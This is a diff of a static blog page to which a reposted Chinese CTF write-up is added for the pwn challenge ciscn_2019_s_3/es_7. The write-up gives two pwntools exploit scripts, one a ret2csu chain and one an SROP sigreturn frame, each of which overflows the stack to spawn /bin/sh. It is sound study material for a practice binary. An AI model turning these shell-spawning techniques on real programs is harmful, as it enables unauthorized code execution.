@@ -120,7 +120,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    16 字
+                    578 字
                   </span>&nbsp;
                 
 
@@ -128,7 +128,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      1 分钟
+                      2 分钟
                   </span>&nbsp;
                 
 
@@ -161,8 +161,31 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1 id="SROP-ciscn-2019-s-3"><a href="#SROP-ciscn-2019-s-3" class="headerlink" title="SROP-ciscn_2019_s_3"></a>SROP-ciscn_2019_s_3</h1><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p>
-<p><a href="https://www.jianshu.com/p/ca4a5dacd1a2" target="_blank" rel="noopener">比较详细的WP</a></p>
+            <h1 id="SROP-ciscn-2019-s-3-es-7"><a href="#SROP-ciscn-2019-s-3-es-7" class="headerlink" title="SROP-ciscn_2019_s_3/es_7"></a>SROP-ciscn_2019_s_3/es_7</h1><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p>
+<p><a href="https://blog.csdn.net/github_36788573/article/details/103541178" target="_blank" rel="noopener">比较详细的WP</a></p>
+<p><a href="https://www.jianshu.com/p/ca4a5dacd1a2" target="_blank" rel="noopener">https://www.jianshu.com/p/ca4a5dacd1a2</a></p>
+<blockquote>
+<p>两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。<br>还有一个gadget函数。</p>
+<p><img src="/2020/01/14/SROP-ciscn_2019_s_3/20191214171639948.png" srcset="undefined" alt="在这里插入图片描述"></p>
+<p>有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。<br>15 sys_rt_sigreturn<br>59 sys_execve</p>
+<p>解法一<br>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。<img src="/2020/01/14/SROP-ciscn_2019_s_3/20191214172422496.png" srcset="undefined" alt="在这里插入图片描述"></p>
+<p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
+<p>from pwn import *</p>
+<p>io=process(‘pwn’)<br>main=0x0004004ED<br>execv=0x04004E2<br>pop_rdi=0x4005a3<br>pop_rbx_rbp_r12_r13_r14_r15=0x40059A<br>mov_rdxr13_call=0x0400580<br>sys_write=0x00400517</p>
+<p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280<br>print(hex(sh))</p>
+<p>pl2=’/bin/sh\x00’<em>2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)</em>2+p64(sh+0x50)+p64(0)*3<br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys_write)<br>io.send(pl2)</p>
+<p>io.interactive()</p>
+<p>解法2<br>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。<br>具体可参考：Framing Signals—A Return to Portable Shellcode</p>
+<p>from pwn import *</p>
+<p>io=process(‘pwn’)<br>context.binary=’./pwn’<br>context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p>
+<p>main=0x0004004ED<br>sigret=0x4004DA<br>sys_write=0x400517</p>
+<p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280 #sh值为binsh所在的位置<br>print(hex(sh))</p>
+<p>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = sh<br>frame.rsi = 0<br>frame.rdx = 0<br>frame.rip = sys</p>
+<p>pl1=’a’*16+p64(sigret)+p64(sys_write)+str(frame)</p>
+<p>‘’’<br>def debug(addr):<br>   raw_input(‘debug:’)<br>   gdb.attach(io, “b *” + addr)<br>debug(‘0x400514’)<br>‘’’</p>
+<p>pl2=’/bin/sh\x00’*2+p64(sigret)+p64(sys_write)+str(frame)<br>io.send(pl2)</p>
+<p>io.interactive()<br>————————————————<br>版权声明：本文为CSDN博主「yudhui」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_36788573/article/details/103541178" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103541178</a></p>
+</blockquote>
 
             <hr>
           </div>
